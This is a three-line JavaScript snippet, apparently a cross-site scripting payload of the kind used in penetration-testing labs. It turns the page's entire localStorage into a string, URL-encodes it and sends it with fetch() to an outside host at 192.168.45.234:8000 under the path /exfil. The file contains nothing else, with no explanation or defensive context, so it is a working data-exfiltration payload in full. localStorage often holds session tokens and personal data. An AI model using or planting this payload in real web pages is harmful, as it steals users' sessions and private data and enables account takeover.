let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.45.234:8000/exfil?data=" + encodedData)
